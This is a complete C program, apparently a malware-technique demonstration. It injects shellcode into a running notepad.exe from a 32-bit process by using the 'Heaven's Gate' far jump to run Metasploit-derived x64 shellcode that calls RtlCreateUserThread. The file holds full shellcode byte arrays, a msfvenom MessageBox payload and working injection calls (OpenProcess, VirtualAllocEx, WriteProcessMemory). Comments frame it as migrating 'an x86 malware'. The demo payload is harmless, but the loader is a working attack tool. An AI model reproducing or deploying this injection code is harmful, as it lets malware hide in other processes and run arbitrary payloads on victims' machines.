#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#include "src.h"

/*
    * For x86 processes on x64 system, the process is actually still an x64 process, but running on the WOW layer.
    * The address space is limited to 4k because the code selector is set to 0x23, which sets the limit to 4k.
    * To break out of this, we can do a farjmp to set cs to 0x33, like jmp 0x33:<address>
    * The address we jmp to, can execute x64 code. This is called heaven's gate.

    * In order to migrate our payload as an x86 malware, we write the x64 payload into victim process first.
    * However, we still can't create thread on it, since we are a different architecture.
    * We first execute a shellcode to bring us through heaven's gate on our malware process, so our process effectively becomes an x64 process.

    * Now with the ability to run x64 assembly, we call the x64 ntdll(loaded in even x86 processes by default)'s RtlCreateUserThread function.
    * This runs our x64 payload as x64 on the target.

    * Finally, the shellcode brings us back to x86 hell, where our normal cleanup code runs.
*/

int FindTarget(const wchar_t *procname)
{
    HANDLE          hProcSnap = NULL;
    PROCESSENTRY32  pe32 = { 0 };
    int             pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}



int main(void)
{
    int             pid = 0;
    HANDLE          notepad = NULL;
    LPVOID          remotebuf = NULL;
    EXECUTEX64      pExecuteX64 = NULL;
    X64FUNCTION     pX64function = NULL;
    WOW64CONTEXT    *ctx = NULL;


    /*
        * We are x86, first launch a x64 notepad.exe instance and locate it.
    */
    pid = FindTarget(L"notepad.exe");

    if (!pid)
        kill("[-] No notepad.exe instances found.");
    
    printf("Notepad.exe PID = %d\n", pid);

    /*
        * Shellcode to perform farjmp through heaven's gate and execute as x64 code
        * https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
    */
    unsigned char execute64[] = { 0x55, 0x89, 0xe5, 0x56, 0x57, 0x8b, 0x75, 0x8, 0x8b, 0x4d, 0xc, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x83, 0xc0, 0x25, 0x83, 0xec, 0x8, 0x89, 0xe2, 0xc7, 0x42, 0x4, 0x33, 0x0, 0x0, 0x0, 0x89, 0x2, 0xe8, 0x9, 0x0, 0x0, 0x0, 0x83, 0xc4, 0x14, 0x5f, 0x5e, 0x5d, 0xc2, 0x8, 0x0, 0x8b, 0x3c, 0x24, 0xff, 0x2a, 0x48, 0x31, 0xc0, 0x57, 0xff, 0xd6, 0x5f, 0x50, 0xc7, 0x44, 0x24, 0x4, 0x23, 0x0, 0x0, 0x0, 0x89, 0x3c, 0x24, 0xff, 0x2c, 0x24 };

    /*
        * Shellcode to call x64 RtlCreateUserThread
        * https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
    */
    unsigned char call_create[] = { 0xfc, 0x48, 0x89, 0xce, 0x48, 0x89, 0xe7, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x66, 0x81, 0x78, 0x18, 0xb, 0x2, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x48, 0x8d, 0x46, 0x18, 0x50, 0xff, 0x76, 0x10, 0xff, 0x76, 0x8, 0x41, 0x51, 0x41, 0x51, 0x49, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x31, 0xd2, 0x48, 0x8b, 0xe, 0x41, 0xba, 0xc8, 0x38, 0xa4, 0x40, 0xff, 0xd5, 0x48, 0x85, 0xc0, 0x74, 0xc, 0x48, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xeb, 0xa, 0x48, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x50, 0x48, 0x89, 0xfc, 0xc3 };

    // msfvenom --platform windows -p windows/x64/messagebox TEXT="shellcode execution" EXITFUNC=thread -f c
    unsigned char buf[327] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
        "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
        "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
        "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
        "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
        "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
        "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
        "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
        "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
        "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
        "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
        "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
        "\x85\x2e\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x73\x68\x65\x6c\x6c"
        "\x63\x6f\x64\x65\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x00"
        "\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";

    if (!(notepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)))
        kill("[-] OpenProcess fail.");

    if (!(remotebuf = VirtualAllocEx(notepad, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)))
        kill("[-] VirtualAllocEx fail.");

    if (!WriteProcessMemory(notepad, remotebuf, buf, sizeof(buf), NULL))
        kill("[-] WriteProcessMemory fail.");

    /*
        * Transit to x64 through heaven's gate!
    */
    if (!(pExecuteX64 = VirtualAlloc(NULL, sizeof(execute64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
        kill("[-] VirtualAlloc fail.");

    /*
        * RWX because this shellcode modifies itself in memory
    */
    if (!(pX64function = VirtualAlloc(NULL, sizeof(call_create) + sizeof(WOW64CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
        kill("[-] VirtualAlloc fail.");

    memcpy(pExecuteX64, execute64, sizeof(execute64));
    memcpy(pX64function, call_create, sizeof(call_create));

    ctx = (WOW64CONTEXT *)((UINT64)pX64function + sizeof(call_create));
    ctx->h.hProcess = notepad;
    ctx->p.lpParameter = 0;
    ctx->s.lpStartAddress = remotebuf;
    ctx->t.hThread = 0; // just a qword of space for output. shellcode takes care

    pExecuteX64(pX64function, (DWORD)ctx);

    if (ctx->t.hThread) {
        // if success, resume the thread -> execute payload
        printf("Thread should be there, frozen...\n"); getchar();
        ResumeThread(ctx->t.hThread);
    }

    VirtualFree(pExecuteX64, 0, MEM_RELEASE);
    VirtualFree(pX64function, 0, MEM_RELEASE);

    return 0;
}